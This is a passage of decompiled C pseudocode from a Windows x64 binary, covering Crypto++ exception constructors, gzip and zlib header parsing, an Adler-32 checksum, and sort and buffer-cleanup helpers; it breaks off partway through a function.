  sub_140004F20(&Dst, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)v1);
  *(_QWORD *)v1 = &off_1400A8798;
  v1[6] = 4;
  v2 = (signed __int64)(v1 + 8);
  *(_QWORD *)(v2 + 24) = 15i64;
  *(_QWORD *)(v2 + 16) = 0i64;
  *(_BYTE *)v2 = 0;
  sub_140004DF0(v1 + 8, &Dst, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v1 = &off_1400A8798;
  if ( v6 >= 0x10 )
    operator delete(Dst);
  *(_QWORD *)v1 = &off_1400A8798;
  return v1;
}
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140091100) ----------------------------------------------------
_DWORD *__fastcall sub_140091100(_DWORD *a1)
{
  _DWORD *v1; // rbx
  signed __int64 v2; // rcx
  void *Dst; // [rsp+30h] [rbp-38h]
  __int64 v5; // [rsp+40h] [rbp-28h]
  unsigned __int64 v6; // [rsp+48h] [rbp-20h]

  v1 = a1;
  v6 = 15i64;
  v5 = 0i64;
  LOBYTE(Dst) = 0;
  sub_140004F20(&Dst, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)v1);
  *(_QWORD *)v1 = &off_1400A8798;
  v1[6] = 3;
  v2 = (signed __int64)(v1 + 8);
  *(_QWORD *)(v2 + 24) = 15i64;
  *(_QWORD *)(v2 + 16) = 0i64;
  *(_BYTE *)v2 = 0;
  sub_140004DF0(v1 + 8, &Dst, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v1 = &off_1400A8798;
  if ( v6 >= 0x10 )
    operator delete(Dst);
  *(_QWORD *)v1 = &off_1400A8798;
  return v1;
}
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (00000001400911E0) ----------------------------------------------------
_DWORD *__fastcall sub_1400911E0(_DWORD *a1)
{
  _DWORD *v1; // rbx
  signed __int64 v2; // rcx
  void *Dst; // [rsp+30h] [rbp-38h]
  __int64 v5; // [rsp+40h] [rbp-28h]
  unsigned __int64 v6; // [rsp+48h] [rbp-20h]

  v1 = a1;
  v6 = 15i64;
  v5 = 0i64;
  LOBYTE(Dst) = 0;
  sub_140004F20(&Dst, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)v1);
  *(_QWORD *)v1 = &off_1400A8798;
  v1[6] = 3;
  v2 = (signed __int64)(v1 + 8);
  *(_QWORD *)(v2 + 24) = 15i64;
  *(_QWORD *)(v2 + 16) = 0i64;
  *(_BYTE *)v2 = 0;
  sub_140004DF0(v1 + 8, &Dst, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v1 = &off_1400A8798;
  if ( v6 >= 0x10 )
    operator delete(Dst);
  *(_QWORD *)v1 = &off_1400A8798;
  return v1;
}
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (00000001400912C0) ----------------------------------------------------
__int64 __fastcall sub_1400912C0(_QWORD *a1)
{
  void *v1; // r8
  _QWORD *v2; // rbx
  unsigned __int64 v3; // rdx
  __int64 result; // rax

  v1 = (void *)*a1;
  v2 = a1;
  if ( *a1 )
  {
    v3 = (signed __int64)((unsigned __int128)((signed __int64)(a1[2] - (_QWORD)v1)
                                            * (signed __int128)3074457345618258603i64) >> 64) >> 2;
    memset(v1, 0, 24 * ((v3 >> 63) + v3));
    free(v1);
    result = 0i64;
    *v2 = 0i64;
    v2[1] = 0i64;
    v2[2] = 0i64;
  }
  return result;
}

//----- (00000001400913B0) ----------------------------------------------------
void __fastcall sub_1400913B0(_QWORD *a1)
{
  void *v1; // r8
  _QWORD *v2; // rbx
  void *v3; // r8
  _DWORD *v4; // rdi
  unsigned __int64 i; // rcx

  v1 = (void *)a1[5];
  v2 = a1;
  if ( v1 )
  {
    memset(
      v1,
      0,
      24
    * (((unsigned __int64)((unsigned __int128)((signed __int64)(a1[7] - (_QWORD)v1)
                                             * (signed __int128)3074457345618258603i64) >> 64) >> 63)
     + ((signed __int64)((unsigned __int128)((signed __int64)(a1[7] - (_QWORD)v1)
                                           * (signed __int128)3074457345618258603i64) >> 64) >> 2)));
    free(v1);
    v2[5] = 0i64;
    v2[6] = 0i64;
    v2[7] = 0i64;
  }
  v3 = (void *)v2[2];
  if ( v3 )
  {
    v4 = (_DWORD *)v2[2];
    for ( i = 3
            * (((unsigned __int64)((unsigned __int128)((signed __int64)(v2[4] - (_QWORD)v3)
                                                     * (signed __int128)3074457345618258603i64) >> 64) >> 63)
             + ((signed __int64)((unsigned __int128)((signed __int64)(v2[4] - (_QWORD)v3)
                                                   * (signed __int128)3074457345618258603i64) >> 64) >> 1)); i; --i )
    {
      *v4 = 0;
      ++v4;
    }
    free(v3);
    v2[2] = 0i64;
    v2[3] = 0i64;
    v2[4] = 0i64;
  }
}

//----- (0000000140091470) ----------------------------------------------------
__int64 __fastcall sub_140091470(__int64 a1)
{
  return *(unsigned int *)(a1 + 48);
}

//----- (0000000140091480) ----------------------------------------------------
signed __int64 sub_140091480()
{
  return 15i64;
}

//----- (0000000140091490) ----------------------------------------------------
signed __int64 sub_140091490()
{
  return 1024i64;
}

//----- (00000001400914A0) ----------------------------------------------------
__int64 __fastcall sub_1400914A0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rsi
  __int64 v4; // rbx
  __int64 v5; // rdi
  __int64 v6; // rax
  char v7; // ST20_1
  __int64 result; // rax

  v3 = a3;
  v4 = a2;
  v5 = a1;
  v6 = (*(__int64 (**)(void))(*(_QWORD *)a1 + 328i64))();
  v7 = 1;
  (*(void (__fastcall **)(__int64, __int64, __int64, _QWORD, char))(*(_QWORD *)v6 + 40i64))(v6, v4, v3, 0i64, v7);
  result = (*(__int64 (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)(v5 + 352) + 24i64))(v5 + 352, v4, v3);
  *(_DWORD *)(v5 + 344) += v3;
  return result;
}

//----- (0000000140091510) ----------------------------------------------------
void __fastcall sub_140091510(__int64 a1)
{
  __int64 v1; // rsi
  void *v2; // rbx
  int v3; // [rsp+20h] [rbp-88h]
  __int64 v4; // [rsp+28h] [rbp-80h]
  __int64 v5; // [rsp+38h] [rbp-70h]
  void *v6; // [rsp+40h] [rbp-68h]
  char v7; // [rsp+50h] [rbp-58h]

  v4 = -2i64;
  v1 = a1;
  v5 = 4i64;
  v2 = sub_14003A000(4ui64);
  v6 = v2;
  if ( (*(__int64 (__fastcall **)(__int64, void *, signed __int64))(*(_QWORD *)(v1 + 56) + 136i64))(v1 + 56, v2, 4i64) != 4 )
  {
    sub_140091020(&v7);
    CxxThrowException(&v7, &_TI4_AVcls_107_cls_106_CryptoPP__);
  }
  if ( !(*(unsigned __int8 (__fastcall **)(__int64, void *))(*(_QWORD *)(v1 + 352) + 96i64))(v1 + 352, v2) )
  {
    sub_140091100(&v7);
    CxxThrowException(&v7, &_TI4_AVcls_108_cls_106_CryptoPP__);
  }
  if ( sub_140038A10((__int64 *)(v1 + 56), &v3, 0) != 4 )
  {
    sub_140091020(&v7);
    CxxThrowException(&v7, &_TI4_AVcls_107_cls_106_CryptoPP__);
  }
  if ( v3 != *(_DWORD *)(v1 + 344) )
  {
    sub_1400911E0(&v7);
    CxxThrowException(&v7, &_TI4_AVcls_109_cls_106_CryptoPP__);
  }
  memset(v2, 0, 4ui64);
  free(v2);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D47F0: using guessed type int _TI4_AVcls_107_cls_106_CryptoPP__;
// 1400D4860: using guessed type int _TI4_AVcls_108_cls_106_CryptoPP__;
// 1400D48D0: using guessed type int _TI4_AVcls_109_cls_106_CryptoPP__;

//----- (0000000140091670) ----------------------------------------------------
__int64 __fastcall sub_140091670(__int64 a1)
{
  __int64 v1; // rbx
  __int64 v2; // rax
  __int64 *v3; // rbx
  __int64 result; // rax
  __int64 v5; // rax
  unsigned __int8 v6; // [rsp+20h] [rbp-60h]
  char v7; // [rsp+21h] [rbp-5Fh]
  unsigned __int16 v8; // [rsp+24h] [rbp-5Ch]
  char v9; // [rsp+30h] [rbp-50h]
  char v10; // [rsp+70h] [rbp-10h]
  char v11; // [rsp+71h] [rbp-Fh]

  v1 = a1;
  *(_DWORD *)(a1 + 344) = 0;
  (*(void (**)(void))(*(_QWORD *)(a1 + 352) + 48i64))();
  v2 = *(_QWORD *)(v1 + 56);
  v3 = (__int64 *)(v1 + 56);
  if ( (*(__int64 (__fastcall **)(__int64 *, char *, signed __int64))(v2 + 136))(v3, &v10, 2i64) != 2 )
  {
    sub_140090EE0(&v9);
    CxxThrowException(&v9, &_TI4_AVcls_084_cls_106_CryptoPP__);
  }
  if ( v10 != 31 || v11 != -117 )
  {
    sub_140090EE0(&v9);
    CxxThrowException(&v9, &_TI4_AVcls_084_cls_106_CryptoPP__);
  }
  if ( !(*(__int64 (__fastcall **)(__int64 *, signed __int64))(*v3 + 168))(v3, 1i64) )
  {
    sub_140090EE0(&v9);
    CxxThrowException(&v9, &_TI4_AVcls_084_cls_106_CryptoPP__);
  }
  if ( !(*(__int64 (__fastcall **)(__int64 *, unsigned __int8 *))(*v3 + 144))(v3, &v6) )
  {
    sub_140090EE0(&v9);
    CxxThrowException(&v9, &_TI4_AVcls_084_cls_106_CryptoPP__);
  }
  if ( v6 & 0x22 )
  {
    sub_140090EE0(&v9);
    CxxThrowException(&v9, &_TI4_AVcls_084_cls_106_CryptoPP__);
  }
  if ( (*(__int64 (__fastcall **)(__int64 *, signed __int64))(*v3 + 168))(v3, 6i64) != 6 )
  {
    sub_140090EE0(&v9);
    CxxThrowException(&v9, &_TI4_AVcls_084_cls_106_CryptoPP__);
  }
  result = v6;
  if ( v6 & 4 )
  {
    if ( sub_1400389E0(v3, &v8, 0) != 2 )
    {
      sub_140090EE0(&v9);
      CxxThrowException(&v9, &_TI4_AVcls_084_cls_106_CryptoPP__);
    }
    v5 = (*(__int64 (__fastcall **)(__int64 *, _QWORD))(*v3 + 168))(v3, v8);
    if ( v5 != v8 )
    {
      sub_140090EE0(&v9);
      CxxThrowException(&v9, &_TI4_AVcls_084_cls_106_CryptoPP__);
    }
    result = v6;
  }
  if ( result & 8 )
  {
    do
    {
      if ( !(*(__int64 (__fastcall **)(__int64 *, char *))(*v3 + 144))(v3, &v7) )
      {
        sub_140090EE0(&v9);
        CxxThrowException(&v9, &_TI4_AVcls_084_cls_106_CryptoPP__);
      }
    }
    while ( v7 );
    result = v6;
  }
  if ( result & 0x10 )
  {
    do
    {
      result = (*(__int64 (__fastcall **)(__int64 *, char *))(*v3 + 144))(v3, &v7);
      if ( !result )
      {
        sub_140090EE0(&v9);
        CxxThrowException(&v9, &_TI4_AVcls_084_cls_106_CryptoPP__);
      }
    }
    while ( v7 );
  }
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D4758: using guessed type int _TI4_AVcls_084_cls_106_CryptoPP__;

//----- (00000001400918F0) ----------------------------------------------------
void __fastcall sub_1400918F0(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 48) = a2;
}

//----- (0000000140091900) ----------------------------------------------------
__int64 __fastcall sub_140091900(_QWORD *a1)
{
  void *v1; // r8
  _QWORD *v2; // rbx
  _DWORD *v3; // rdi
  unsigned __int64 v4; // rdx
  signed __int64 i; // rcx
  __int64 result; // rax

  v1 = (void *)*a1;
  v2 = a1;
  if ( *a1 )
  {
    v3 = (_DWORD *)*a1;
    v4 = (signed __int64)((unsigned __int128)((signed __int64)(a1[2] - (_QWORD)v1)
                                            * (signed __int128)3074457345618258603i64) >> 64) >> 1;
    for ( i = 3 * ((v4 >> 63) + v4); i; --i )
    {
      *v3 = 0;
      ++v3;
    }
    free(v1);
    result = 0i64;
    *v2 = 0i64;
    v2[1] = 0i64;
    v2[2] = 0i64;
  }
  return result;
}

//----- (0000000140091970) ----------------------------------------------------
__int64 __fastcall sub_140091970(__int64 a1, _BYTE *a2, unsigned __int64 a3)
{
  _BYTE *v3; // rsi
  unsigned __int64 v4; // rbx
  _BYTE *v5; // rdi
  __int64 result; // rax
  signed __int64 v7; // rbx
  signed __int64 v8; // rbx

  v3 = a2;
  v4 = a3;
  v5 = (_BYTE *)a1;
  result = sub_140039810(a1, a3);
  if ( v4 )
  {
    v7 = v4 - 1;
    if ( v7 )
    {
      v8 = v7 - 1;
      if ( v8 )
      {
        if ( v8 != 1 )
          v3[3] = v5[8];
        v3[2] = v5[9];
      }
      v3[1] = v5[10];
    }
    result = (unsigned __int8)v5[11];
    *v3 = result;
  }
  *((_DWORD *)v5 + 2) = 1;
  return result;
}

//----- (00000001400919E0) ----------------------------------------------------
__int64 __fastcall sub_1400919E0(__int64 a1, unsigned __int8 *a2, __int64 a3)
{
  unsigned int v3; // er9
  unsigned int v4; // er10
  unsigned __int8 *v5; // r11
  __int64 v6; // rbx
  int v7; // eax
  __int64 result; // rax
  signed __int64 v9; // rcx
  int v10; // eax
  int v11; // er9
  int v12; // er10
  int v13; // er9
  int v14; // er10
  int v15; // er9
  int v16; // er10
  int v17; // er9
  int v18; // er10
  int v19; // er9
  int v20; // er10
  int v21; // er9
  int v22; // er10
  int v23; // er9
  int v24; // er10

  v3 = *(unsigned __int16 *)(a1 + 8);
  v4 = *(unsigned __int16 *)(a1 + 10);
  v5 = a2;
  v6 = a1;
  if ( a3 & 7 )
  {
    do
    {
      v7 = *v5;
      --a3;
      ++v5;
      v3 += v7;
      v4 += v3;
    }
    while ( a3 & 7 );
    if ( v3 >= 0xFFF1 )
      v3 -= 65521;
    result = -65521 * (v4 / 0xFFF1);
    v4 %= 0xFFF1u;
  }
  if ( a3 )
  {
    v9 = (signed __int64)(v5 + 2);
    do
    {
      v10 = *(unsigned __int8 *)(v9 - 2);
      a3 -= 8i64;
      v9 += 8i64;
      v11 = v10 + v3;
      v12 = v11 + v4;
      v13 = *(unsigned __int8 *)(v9 - 9) + v11;
      v14 = v13 + v12;
      v15 = *(unsigned __int8 *)(v9 - 8) + v13;
      v16 = v15 + v14;
      v17 = *(unsigned __int8 *)(v9 - 7) + v15;
      v18 = v17 + v16;
      v19 = *(unsigned __int8 *)(v9 - 6) + v17;
      v20 = v19 + v18;
      v21 = *(unsigned __int8 *)(v9 - 5) + v19;
      v22 = v21 + v20;
      v23 = *(unsigned __int8 *)(v9 - 4) + v21;
      result = *(unsigned __int8 *)(v9 - 3);
      v24 = v23 + v22;
      v3 = result + v23;
      v4 = v3 + v24;
      if ( v3 >= 0xFFF1 )
        v3 -= 65521;
      if ( !(a3 & 0x7FFF) )
      {
        result = -65521 * (v4 / 0xFFF1);
        v4 %= 0xFFF1u;
      }
    }
    while ( a3 );
    *(_WORD *)(v6 + 8) = v3;
    *(_WORD *)(v6 + 10) = v4;
  }
  else
  {
    *(_WORD *)(a1 + 8) = v3;
    *(_WORD *)(a1 + 10) = v4;
  }
  return result;
}

//----- (0000000140091B00) ----------------------------------------------------
_DWORD *__fastcall sub_140091B00(_DWORD *a1)
{
  _DWORD *v1; // rbx
  signed __int64 v2; // rcx
  void *Dst; // [rsp+30h] [rbp-38h]
  __int64 v5; // [rsp+40h] [rbp-28h]
  unsigned __int64 v6; // [rsp+48h] [rbp-20h]

  v1 = a1;
  v6 = 15i64;
  v5 = 0i64;
  LOBYTE(Dst) = 0;
  sub_140004F20(&Dst, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)v1);
  *(_QWORD *)v1 = &off_1400A8798;
  v1[6] = 4;
  v2 = (signed __int64)(v1 + 8);
  *(_QWORD *)(v2 + 24) = 15i64;
  *(_QWORD *)(v2 + 16) = 0i64;
  *(_BYTE *)v2 = 0;
  sub_140004DF0(v1 + 8, &Dst, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v1 = &off_1400A8798;
  if ( v6 >= 0x10 )
    operator delete(Dst);
  *(_QWORD *)v1 = &off_1400A8798;
  return v1;
}
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140091C60) ----------------------------------------------------
std::exception *__fastcall sub_140091C60(std::exception *a1, const struct std::exception *a2)
{
  std::exception *v2; // rbx

  v2 = a1;
  sub_140090E60(a1, a2);
  *(_QWORD *)v2 = &off_1400A8798;
  return v2;
}
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140091C90) ----------------------------------------------------
_DWORD *__fastcall sub_140091C90(_DWORD *a1)
{
  _DWORD *v1; // rbx
  signed __int64 v2; // rcx
  void *Dst; // [rsp+30h] [rbp-38h]
  __int64 v5; // [rsp+40h] [rbp-28h]
  unsigned __int64 v6; // [rsp+48h] [rbp-20h]

  v1 = a1;
  v6 = 15i64;
  v5 = 0i64;
  LOBYTE(Dst) = 0;
  sub_140004F20(&Dst, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)v1);
  *(_QWORD *)v1 = &off_1400A8798;
  v1[6] = 4;
  v2 = (signed __int64)(v1 + 8);
  *(_QWORD *)(v2 + 24) = 15i64;
  *(_QWORD *)(v2 + 16) = 0i64;
  *(_BYTE *)v2 = 0;
  sub_140004DF0(v1 + 8, &Dst, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v1 = &off_1400A8798;
  if ( v6 >= 0x10 )
    operator delete(Dst);
  *(_QWORD *)v1 = &off_1400A8798;
  return v1;
}
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140091D70) ----------------------------------------------------
_DWORD *__fastcall sub_140091D70(_DWORD *a1)
{
  _DWORD *v1; // rbx
  signed __int64 v2; // rcx
  void *Dst; // [rsp+30h] [rbp-38h]
  __int64 v5; // [rsp+40h] [rbp-28h]
  unsigned __int64 v6; // [rsp+48h] [rbp-20h]

  v1 = a1;
  v6 = 15i64;
  v5 = 0i64;
  LOBYTE(Dst) = 0;
  sub_140004F20(&Dst, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)v1);
  *(_QWORD *)v1 = &off_1400A8798;
  v1[6] = 4;
  v2 = (signed __int64)(v1 + 8);
  *(_QWORD *)(v2 + 24) = 15i64;
  *(_QWORD *)(v2 + 16) = 0i64;
  *(_BYTE *)v2 = 0;
  sub_140004DF0(v1 + 8, &Dst, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v1 = &off_1400A8798;
  if ( v6 >= 0x10 )
    operator delete(Dst);
  *(_QWORD *)v1 = &off_1400A8798;
  return v1;
}
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140091E50) ----------------------------------------------------
_DWORD *__fastcall sub_140091E50(_DWORD *a1)
{
  _DWORD *v1; // rbx
  signed __int64 v2; // rcx
  void *Dst; // [rsp+30h] [rbp-38h]
  __int64 v5; // [rsp+40h] [rbp-28h]
  unsigned __int64 v6; // [rsp+48h] [rbp-20h]

  v1 = a1;
  v6 = 15i64;
  v5 = 0i64;
  LOBYTE(Dst) = 0;
  sub_140004F20(&Dst, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)v1);
  *(_QWORD *)v1 = &off_1400A8798;
  v1[6] = 3;
  v2 = (signed __int64)(v1 + 8);
  *(_QWORD *)(v2 + 24) = 15i64;
  *(_QWORD *)(v2 + 16) = 0i64;
  *(_BYTE *)v2 = 0;
  sub_140004DF0(v1 + 8, &Dst, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v1 = &off_1400A8798;
  if ( v6 >= 0x10 )
    operator delete(Dst);
  *(_QWORD *)v1 = &off_1400A8798;
  return v1;
}
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140091F30) ----------------------------------------------------
__int64 __fastcall sub_140091F30(__int64 a1)
{
  void *v1; // rdi
  unsigned __int64 v2; // rdx
  __int64 result; // rax

  v1 = *(void **)(a1 + 16);
  v2 = *(_QWORD *)(a1 + 8);
  if ( v1 == (void *)a1 )
  {
    *(_BYTE *)(a1 + 5) = 0;
    result = 0i64;
    memset(v1, 0, v2);
  }
  return result;
}

//----- (0000000140091F54) ----------------------------------------------------
void *__fastcall sub_140091F54(__int64 a1, char a2)
{
  return sub_140091F60((void *)(a1 - 8), a2);
}

//----- (0000000140091F60) ----------------------------------------------------
void *__fastcall sub_140091F60(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_140091330();
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 140091330: using guessed type __int64 sub_140091330(void);

//----- (0000000140091FA0) ----------------------------------------------------
signed __int64 sub_140091FA0()
{
  return 4i64;
}

//----- (0000000140091FB0) ----------------------------------------------------
__int64 __fastcall sub_140091FB0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rdi
  __int64 v4; // rsi
  __int64 v5; // rbx
  __int64 v6; // rax
  char v7; // ST20_1

  v3 = a3;
  v4 = a2;
  v5 = a1;
  v6 = (*(__int64 (**)(void))(*(_QWORD *)a1 + 328i64))();
  v7 = 1;
  (*(void (__fastcall **)(__int64, __int64, __int64, _QWORD, char))(*(_QWORD *)v6 + 40i64))(v6, v4, v3, 0i64, v7);
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)(v5 + 352) + 24i64))(v5 + 352, v4, v3);
}

//----- (0000000140092010) ----------------------------------------------------
char *__fastcall sub_140092010(__int64 a1)
{
  __int64 v1; // rdi
  char *result; // rax
  char v3; // [rsp+28h] [rbp-70h]
  char v4; // [rsp+2Dh] [rbp-6Bh]
  unsigned __int64 v5; // [rsp+30h] [rbp-68h]
  char *v6; // [rsp+38h] [rbp-60h]
  char v7; // [rsp+40h] [rbp-58h]

  v1 = a1;
  v5 = 4i64;
  v4 = 1;
  v6 = &v3;
  if ( (*(__int64 (__fastcall **)(__int64, char *, signed __int64))(*(_QWORD *)(a1 + 56) + 136i64))(a1 + 56, &v3, 4i64) != 4 )
  {
    sub_140091E50(&v7);
    CxxThrowException(&v7, &_TI4_AVcls_090_cls_085_CryptoPP__);
  }
  if ( !(*(unsigned __int8 (__fastcall **)(__int64, char *))(*(_QWORD *)(v1 + 352) + 96i64))(v1 + 352, v6) )
  {
    sub_140091E50(&v7);
    CxxThrowException(&v7, &_TI4_AVcls_090_cls_085_CryptoPP__);
  }
  result = &v3;
  if ( v6 == &v3 )
  {
    result = 0i64;
    memset(v6, 0, v5);
  }
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D4A90: using guessed type int _TI4_AVcls_090_cls_085_CryptoPP__;

//----- (00000001400920F0) ----------------------------------------------------
__int64 __fastcall sub_1400920F0(__int64 a1)
{
  __int64 v1; // rdi
  int v2; // ecx
  __int64 result; // rax
  unsigned __int8 v4; // [rsp+20h] [rbp-68h]
  unsigned __int8 v5; // [rsp+21h] [rbp-67h]
  char v6; // [rsp+30h] [rbp-58h]

  v1 = a1;
  (*(void (**)(void))(*(_QWORD *)(a1 + 352) + 48i64))();
  if ( !(*(__int64 (__fastcall **)(__int64, unsigned __int8 *))(*(_QWORD *)(v1 + 56) + 144i64))(v1 + 56, &v5)
    || !(*(__int64 (__fastcall **)(__int64, unsigned __int8 *))(*(_QWORD *)(v1 + 56) + 144i64))(v1 + 56, &v4) )
  {
    sub_140091B00(&v6);
    CxxThrowException(&v6, &_TI4_AVcls_084_cls_085_CryptoPP__);
  }
  v2 = v4 + (v5 << 8);
  result = (unsigned int)(31 * (v2 / 31));
  if ( v2 != (_DWORD)result )
  {
    sub_140091B00(&v6);
    CxxThrowException(&v6, &_TI4_AVcls_084_cls_085_CryptoPP__);
  }
  if ( (v5 & 0xF) != 8 )
  {
    sub_140091C90(&v6);
    CxxThrowException(&v6, &_TI4_AVcls_088_cls_085_CryptoPP__);
  }
  if ( v4 & 0x20 )
  {
    sub_140091D70(&v6);
    CxxThrowException(&v6, &_TI4_AVcls_089_cls_085_CryptoPP__);
  }
  *(_DWORD *)(v1 + 344) = ((unsigned int)v5 >> 4) + 8;
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D4940: using guessed type int _TI4_AVcls_084_cls_085_CryptoPP__;
// 1400D49B0: using guessed type int _TI4_AVcls_088_cls_085_CryptoPP__;
// 1400D4A20: using guessed type int _TI4_AVcls_089_cls_085_CryptoPP__;

//----- (0000000140092240) ----------------------------------------------------
void __fastcall sub_140092240(__int64 a1, __int64 a2)
{
  signed __int64 v2; // r8
  __int64 v3; // rbx
  __int64 i; // r10
  __int64 v5; // xmm1_8
  int v6; // er11
  signed __int64 v7; // r9
  unsigned int v8; // edx
  signed __int64 k; // rax
  __int64 v10; // xmm0_8
  signed __int64 j; // rcx

  if ( a1 != a2 )
  {
    v2 = a1 + 12;
    v3 = a2;
    for ( i = a1; v2 != v3; v2 += 12i64 )
    {
      v5 = *(_QWORD *)v2;
      v6 = *(_DWORD *)(v2 + 8);
      v7 = v2;
      v8 = *(_QWORD *)v2;
      if ( v8 >= *(_DWORD *)i )
      {
        for ( j = v2 - 12; v8 < *(_DWORD *)j; j -= 12i64 )
        {
          *(_QWORD *)v7 = *(_QWORD *)j;
          *(_DWORD *)(v7 + 8) = *(_DWORD *)(j + 8);
          v7 = j;
        }
        *(_QWORD *)v7 = v5;
        *(_DWORD *)(v7 + 8) = v6;
      }
      else
      {
        for ( k = v2; k != i; *(_DWORD *)(k + 20) = *(_DWORD *)(k + 8) )
        {
          v10 = *(_QWORD *)(k - 12);
          k -= 12i64;
          *(_QWORD *)(k + 12) = v10;
        }
        *(_QWORD *)i = v5;
        *(_DWORD *)(i + 8) = v6;
      }
    }
  }
}

//----- (00000001400922F0) ----------------------------------------------------
signed __int64 __fastcall sub_1400922F0(__int64 a1, __int64 a2)
{
  __int64 v2; // r9
  signed __int64 v3; // rbx
  signed __int64 result; // rax
  signed __int64 v5; // r11
  signed __int64 v6; // rsi
  signed __int64 v7; // rbp
  __int64 v8; // xmm1_8
  int v9; // er14
  signed __int64 v10; // r8
  signed __int64 i; // rax
  signed __int64 v12; // r8
  signed __int64 v13; // rax
  signed __int64 v14; // rdx
  signed __int64 j; // rdx
  signed __int64 v16; // r10
  signed __int64 v17; // rax
  signed __int64 v18; // rcx

  v2 = a1;
  v3 = ((unsigned __int64)((unsigned __int128)((a2 - a1) * (signed __int128)3074457345618258603i64) >> 64) >> 63)
     + ((signed __int64)((unsigned __int128)((a2 - a1) * (signed __int128)3074457345618258603i64) >> 64) >> 1);
  result = v3 / 2;
  v5 = result;
  if ( result > 0 )
  {
    v6 = 2 * result + 2;
    v7 = a1 + 12 * result;
    do
    {
      v8 = *(_QWORD *)(v7 - 12);
      v9 = *(_DWORD *)(v7 - 4);
      v7 -= 12i64;
      v6 -= 2i64;
      v10 = --v5;
      for ( i = v6; i < v3; i = 2 * i + 2 )
      {
        if ( *(_DWORD *)(v2 + 12 * i) < *(_DWORD *)(v2 + 12 * i - 12) )
          --i;
        v12 = v2 + 12 * v10;
        *(_QWORD *)v12 = *(_QWORD *)(v2 + 12 * i);
        *(_DWORD *)(v12 + 8) = *(_DWORD *)(v2 + 12 * i + 8);
        v10 = i;
      }
      if ( i == v3 )
      {
        v13 = 3 * v10;
        v10 = v3 - 1;
        v14 = v2 + 4 * v13;
        *(_QWORD *)v14 = *(_QWORD *)(v2 + 12 * v3 - 12);
        *(_DWORD *)(v14 + 8) = *(_DWORD *)(v2 + 12 * v3 - 4);
      }
      for ( j = (v10 - 1) / 2; v5 < v10; j = (j - 1) / 2 )
      {
        v16 = v2 + 12 * j;
        if ( *(_DWORD *)(v2 + 12 * j) >= (unsigned int)v8 )
          break;
        v17 = 3 * v10;
        v10 = j;
        v18 = v2 + 4 * v17;
        *(_QWORD *)v18 = *(_QWORD *)v16;
        *(_DWORD *)(v18 + 8) = *(_DWORD *)(v16 + 8);
      }
      result = 3 * v10;
      *(_QWORD *)(v2 + 4 * result) = v8;
      *(_DWORD *)(v2 + 4 * result + 8) = v9;
    }
    while ( v5 > 0 );
  }
  return result;
}

//----- (0000000140092490) ----------------------------------------------------
__int64 __fastcall sub_140092490(unsigned int *a1, unsigned int *a2, __int64 *a3)
{
  unsigned int *v3; // r10
  __int64 *v4; // rbx
  unsigned int *v5; // r11
  signed __int64 v6; // rdx
  signed __int64 v7; // rax
  signed __int64 v8; // r9
  signed __int64 v9; // rdi
  __int64 v10; // xmm1_8
  unsigned int v11; // ecx
  __int64 v12; // xmm1_8
  unsigned int v13; // ecx
  unsigned int *v14; // rdx
  __int64 v15; // xmm1_8
  unsigned int v16; // ecx
  __int64 v17; // xmm1_8
  unsigned int v18; // ecx
  signed __int64 v19; // r8
  signed __int64 v20; // rdx
  __int64 v21; // xmm1_8
  int v22; // ecx
  __int64 v23; // xmm1_8
  int v24; // ecx
  __int64 v25; // xmm1_8
  unsigned int v26; // ecx
  __int64 result; // rax
  __int64 v28; // xmm1_8
  unsigned int v29; // ecx
  __int64 v30; // xmm0_8
  __int64 v31; // xmm1_8
  unsigned int v32; // ecx
  __int64 v33; // xmm1_8
  unsigned int v34; // ecx

  v3 = a2;
  v4 = a3;
  v5 = a1;
